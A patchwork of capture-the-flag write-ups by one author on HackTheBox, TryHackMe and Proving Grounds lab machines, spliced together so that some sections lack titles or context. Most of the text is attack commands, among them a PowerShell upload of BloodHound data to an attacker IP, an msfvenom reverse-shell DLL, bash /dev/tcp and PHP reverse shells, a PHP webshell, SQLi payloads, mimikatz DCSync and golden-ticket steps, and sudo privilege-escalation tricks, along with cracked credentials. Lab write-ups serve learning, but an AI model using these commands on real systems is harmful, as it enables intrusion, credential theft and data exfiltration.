Start-Process powershell -ArgumentList "-NoP -W Hidden -Command Invoke-WebRequest -Uri http://10.10.14.207:80 -Method POST -InFile .\20250419221420_BloodHound.zip"

Restored a 7z file from the recycle bin, extracted it, and found a base64 password in an .ini file:

IXN1QmNpZ0BNZWhUZWQhUgo=

Decoded: !suBcig@MehTed!R -- password for m.schoolbus, who had GPO editing privileges.

docs.title: Privilege escalation
docs.text:
Created and linked a new GPO:

New-GPO -Name GPO-New | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

Used SharpGPOAbuse to add m.schoolbus as local admin:

.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName GPO-new --force

docs.title: Lessons & takeaways
docs.text:
• When SSH GSSAPI fails with getTGT.py, try kinit which populates the default Kerberos cache
  • Always check the recycle bin for deleted files containing credentials
  • SharpGPOAbuse is effective when a user has GPO editing rights
  • RunasCs is useful for lateral movement when WinRM is not available

docs.text: Difficulty: Easy Box: Timelapse (HackTheBox) Author: dsec Date: 2025-09-08

docs.title: SMB guest access to a zip containing a PFX cert. Cracked both, used cert-based WinRM auth. PowerShell history leaked creds for svc_deploy. LAPS Readers group -> local admin password -> DA.
Target info
docs.text:
• Host: 10.129.98.245
  • Domain: timelapse.htb
  • Services discovered: 53/tcp (dns), 88/tcp (kerberos), 445/tcp (smb), 5986/tcp (winrm-ssl)

docs.title: Enumeration
docs.text:
nmap -p53,88,135,139,389,445,464,593,636,5986,9389,49667,49673,49674,49698,65427 -sCV 10.129.98.245 -vvv -Pn

Checked SMB shares with guest access:

nxc smb 10.129.227.113 -u 'guest' -p '' --shares


smbclient.py timelapse.htb/guest:''@10.129.227.113

docs.title: Initial access
docs.text:
Cracked the zip:

zip2john winrm_backup.zip > zip.hash

Unzipped -- found a PFX file:

Cracked the PFX:

pfx2john legacyy_dev_auth.pfx > pfx.hash

Extracted the private key and certificate:

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key

Password is thuglegacy. PEM pass phrase can be anything (4+ chars) -- used test.

openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth_decoded.key


openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt

Connected via WinRM with cert auth:

evil-winrm -i 10.129.98.245 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt

docs.title: Lateral movement
docs.text:
Checked PowerShell history:

type C:\users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Found creds and connected:

evil-winrm -i 10.129.98.245 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

docs.title: Privilege escalation
docs.text:
net user svc_deploy

svc_deploy is in LAPS_Readers -- can read the local admin password managed by LAPS:

Get-ADComputer DC01 -property 'ms-mcs-admpwd'

Got: l2H.h7Ao4m04tk7z+0v5LB.[

evil-winrm -i 10.129.98.245 -S -u administrator -p 'l2H.h7Ao4m04tk7z+0v5LB.['

Note: root.txt is in Users\TRX because LAPS rotates the admin password -- need a static user for persistence.

docs.title: Lessons & takeaways
docs.text:
• PFX files can be cracked with pfx2john and used for cert-based WinRM auth
  • Always check PowerShell history (ConsoleHost_history.txt) for leaked credentials
  • LAPS_Readers membership = local admin password via ms-mcs-admpwd attribute

Initial BloodHound collection failed, so I used dnschef to fake DNS:

docs.title: DLL hijacking -- Kaspersky removal tool
docs.text:
Christine is running that Kaspersky exe -- possible DLL injection.

Evil-WinRM file upload failed -- Constrained Language Mode was preventing scripts.

Used SMB server instead to transfer files:

Ran procmon.exe on host to analyze the Kaspersky removal tool:

Ran the Kaspersky removal tool:

Filtered procmon: Process Name contains KasperskyRemovalTool, Path ends with .dll, Result is NAME NOT FOUND:

Targeted KasperskyRemovalToolENU.dll since the executable attempts to load it multiple times.

Executable is PE32, so need a 32-bit DLL:

msfvenom -p windows/shell_reverse_tcp LHOST=10.8.2.206 LPORT=2222 -f dll > KasperskyRemovalToolENU.dll

Transferred to share, copied to directory, waited a few seconds:

Shell as cpowers -- member of Domain Admins, access to administrator flag.

docs.title: Cross-domain trust abuse
docs.text:
nltest.exe /trusted_domains

Transferred and ran mimikatz:

lsadump::dcsync /domain:lab.trusted.vl /all

Grabbed krbtgt NTLM hash:

c7a03c565c68c6fac5f8913fab576ebd

lsadump::trust /patch

  • S-1-5-21-2241985869-2159962460-1278545866
  • S-1-5-21-3576695518-347000760-3731839591

Created golden ticket with SID history for Enterprise Admins on parent domain:

kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt

DCSync on parent domain:

lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all

Admin hash: 15db914be1e6a896e7692f608a9d72ef

docs.title: Encrypted flag
docs.text:
root.txt was encrypted:

Had to use RunasCs.exe. Verified with:

cipher /u /n

docs.title: Lessons & takeaways
docs.text:
• Don't ignore 301 redirects -- /dev directories are gold
  • PHP filters bypass view-source limitations and reveal server-side code
  • Constrained Language Mode blocks evil-winrm uploads -- pivot to SMB
  • Cross-domain trust abuse: child domain DA + krbtgt hash + trust SIDs = parent domain compromise

docs.title: UpDown -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: UpDown (HackTheBox) Author: dsec Date: 2025-02-27

docs.title: Git dump exposed dev subdomain requiring a custom header. Bypassed upload filters with phar archive trick for PHP execution. SUID Python2 binary exploited via input() eval. Privesc via sudo easy_install GTFOBins.
Target info
docs.text:
• Host: siteisup.htb
  • Services discovered: 22/tcp (ssh), 80/tcp (http)

docs.title: Enumeration
docs.text:
The site checks if websites are up. Tested with my IP -- received connections but couldn't get a shell.

Used git-dumper on the /dev directory:

git-dumper http://siteisup.htb/dev git

Key findings from source code:

  • .htaccess requires Special-Dev: only4dev header
  • index.php blocks bin|usr|home|var|etc in the page parameter and appends .php
  • checker.php blocks extensions: php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar
  • Blocks file://, data://, ftp:// protocols

Added dev.siteisup.htb to /etc/hosts and configured the Special-Dev: only4dev header in browser:

docs.title: Foothold
docs.text:
Created shell.php with <?php phpinfo(); ?> to test execution and check disabled functions.

Packed it into a phar archive with an arbitrary extension to bypass filters:

zip shell.phar shell.php
mv shell.phar shell.0xdf

Uploaded shell.0xdf and found the upload directory:

Files get deleted every 5 minutes by cron, so had to be quick:

Accessed via phar wrapper through the page LFI parameter:

http://dev.siteisup.htb/?page=phar://uploads/900ef1a94818a750d28b0f67291e9a94/shell.0xdf/shell

proc_open was not in the disabled functions list. Found using dfunc-bypasser tool (modified to include the Special-Dev header):

Created reverse shell using proc_open:

<?php
    $descspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.172/443 0>&1'";
    $proc = proc_open($cmd, $descspec, $pipes);

zip rev.0xdf rev.php

Uploaded and triggered:

http://dev.siteisup.htb/?page=phar://uploads/1f034331994c02c3c036237afbb4975c/rev.0xdf/rev

docs.title: Lateral movement
docs.text:
Found SUID binary at /home/developer/dev/siteisup:

Binary ran siteisup_test.py via Python2. The script used input() which in Python2 evaluates expressions via eval():

import requests
url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
    print "Website is up"
else:
    print "Website is down"

Exploited Python2 input():

__import__('os').system('bash')

Verified SSH key worked by comparing md5sums of public key and authorized_keys:

Transferred private key and SSH'd in:

docs.title: Privilege escalation
docs.text:
sudo -l showed easy_install:

GTFOBins for easy_install:

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF

Or manually:

mkdir /tmp/0xdf
echo -e 'import os\n\nos.system("/bin/bash")' > /tmp/0xdf/setup.py
sudo easy_install /tmp/0xdf/

docs.title: Lessons & takeaways
docs.text:
• Git dumps on web servers can expose source code, .htaccess rules, and hidden subdomains
  • Phar archives bypass file extension filters -- rename .phar to an arbitrary extension and use the phar:// wrapper
  • Python2 input() evaluates expressions, making SUID binaries using it trivially exploitable
  • easy_install runs setup.py from a directory, making it a reliable sudo privesc via GTFOBins

docs.title: Usage -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Usage (HackTheBox) Author: dsec Date: 2025-09-03

docs.title: SQLi on the forgot-password page led to admin hash. Laravel-admin file upload bypass for shell. Privesc via 7za wildcard trick to read root SSH key.
Target info
docs.text:
• Host: usage.htb / admin.usage.htb
  • Services discovered: 22/tcp (ssh), 80/tcp (http)

docs.title: Enumeration
docs.text:
Found SQL injection on usage.htb/forget-password:

  • ' gives an error
  • ' or 1=1 limit 1;-- - succeeds

Used sqlmap to extract the admin password hash (bcrypt), cracked with rockyou:

  • admin:whatever1

docs.title: Foothold
docs.text:
Logged into admin.usage.htb:

Laravel-admin 1.8.18 file upload vulnerability (CVE-2023-24249).

Created a PHP webshell:

<?php system($_REQUEST['cmd']); ?>

Renamed to dank.php.jpg:

Upload dank.php.jpg > submit > intercept in Burp > change filename from dank.php.jpg to dank.php > forward requests > refresh page > click administrator top-right > right-click User Image > open image in new tab.

Got reverse shell:

bash -c 'bash -i >%26 /dev/tcp/10.10.14.172/443 0>%261'

docs.title: Lateral movement
docs.text:
Found password in config:

  • 3nc0d3d_pa$$w0rd
su xander

Password 3nc0d3d_pa$$w0rd worked.

docs.title: Privilege escalation
docs.text:
7za wildcard vulnerability -- sudo usage_management runs 7za which misinterprets @ filenames as file lists.

touch @0xdf
ln -fs /root/.ssh/id_rsa 0xdf
sudo usage_management

7za tries to read the symlinked file as a list of filenames, leaking the contents of /root/.ssh/id_rsa in error output.

docs.title: Lessons & takeaways
docs.text:
• Always test forgot-password forms for SQLi
  • Laravel-admin file upload can be bypassed by changing the filename in Burp
  • 7za's @ file-list feature can be abused to read arbitrary files when run with elevated privileges

docs.title: Enumeration revealed a file upload point. Uploaded a malicious .lnk file to coerce authentication via Responder, cracked the hash. Escalation attempted via SeRestorePrivilege (unstable) and ultimately through GPO abuse.
Foothold
docs.text:
Started Responder and uploaded a malicious .lnk file (renamed test.lnk to doc.lnk):

sudo responder -I tun0

Cracked the hash and authenticated.

docs.title: Privesc
docs.text:
BackupPrivilege path failed because the administrator user does not have RDP access.

SeRestorePrivilege path:

.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.247 4444 -e powershell.exe"

Works but then crashes -- unstable.

GPO abuse path:

docs.title: Lessons & takeaways
docs.text:
• Malicious .lnk files on writable shares can coerce NTLMv2 authentication via Responder
  • SeRestorePrivilege can be exploited but may be unstable depending on the binary
  • GPO abuse is a reliable alternative when other privilege escalation paths are unreliable

docs.title: Wreath -- TryHackMe (write-up)
docs.text: Difficulty: Medium Box: Wreath (TryHackMe) -- Network Author: dsec Date: 2025-11-01

docs.title: Multi-host network. Cracked hashes from shadow file, grabbed SSH key for root on first host. Pivoted and discovered internal hosts via ARP and nmap sweep.
Target info
docs.text:
• Host: 10.200.105.200 (initial target)
  • Internal hosts discovered: 10.200.105.100, 10.200.105.150

docs.title: Enumeration
docs.text: Added target to /etc/hosts.

docs.title: Initial foothold
docs.text:
Found hashes in /etc/shadow:

root: $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
twreath: $6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.

Copied /root/.ssh/id_rsa to my machine:

sudo chown daniel:daniel id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.200.105.200

docs.title: Pivoting
docs.text:
Ran arp -a on the compromised host:

Found 10.200.105.150 -- can't ping it.

Ran a static nmap sweep to discover live hosts:

./nmap-static -sn 10.200.105.1-255 -oN scan-USERNAME

Ignore .1 (gateway), .250 (OpenVPN server), and .200 (first machine). Found .100 and .150.

docs.title: Useful notes
docs.text:
LOTL ping sweep from bash:

for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

If ICMP is suspected to be blocked (common with Windows):

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

Windows equivalent of /etc/hosts: C:\Windows\System32\drivers\etc\hosts

Local DNS servers on Linux: /etc/resolv.conf or nmcli dev show

Windows DNS: ipconfig /all

docs.title: Lessons & takeaways
docs.text:
• On multi-host networks, always check ARP tables and do internal sweeps after the first compromise
  • Upload a static nmap binary when the target lacks tools
  • LOTL bash one-liners are useful when you can't transfer tools

docs.title: ZenPhoto -- Proving Grounds (write-up)
docs.text: Difficulty: Easy Box: ZenPhoto (Proving Grounds) Author: dsec Date: 2024-07-17

docs.title: Exploited ZenPhoto with a known RCE exploit to get a shell, ran linpeas, and escalated to root via Dirty COW.
Exploitation
docs.text:
php 18083.php 192.168.220.41 /test/

Pivoted to a better shell.

docs.title: Privilege escalation
docs.text:
Uploaded and ran linpeas.sh:

  • Ran Dirty COW.
  • Shell died and SSH did not work, but was able to connect back in and switch to the firefart user.

docs.title: Lessons & takeaways
docs.text:
• Dirty COW can crash your shell -- have a backup connection method ready
  • Old applications like ZenPhoto often have public RCE exploits that work out of the box
  • When a kernel exploit kills your shell, reconnect through the original exploit path
